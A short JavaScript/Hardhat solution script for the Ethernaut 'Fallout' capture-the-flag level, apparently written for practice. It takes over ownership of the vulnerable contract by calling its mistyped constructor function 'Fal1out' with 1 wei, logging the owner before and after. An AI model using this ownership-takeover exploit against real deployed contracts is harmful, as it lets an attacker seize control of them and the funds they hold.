const { ethers } = require("hardhat");
const Runner = require("./lib/runner");

Runner.run(async () => {
    
    //PLACE FALLOUT CONTRACT ADDRESS HERE (Ethernaut: contract.address)
    const contractAddr = "0x333D1Bcbe36F68c0a24776371B1aDb12059E10aa";     
    
    const contract = await ethers.getContractAt("Fallout", contractAddr);
    
    console.log("* * * ");
    console.log(`contract owner is ${await contract.owner()}`);
    
    //become the owner 
    await contract.Fal1out({value:1}); 
    
    //verify ownership 
    console.log(`contract owner is ${await contract.owner()}`);
    console.log("* * * ");
});
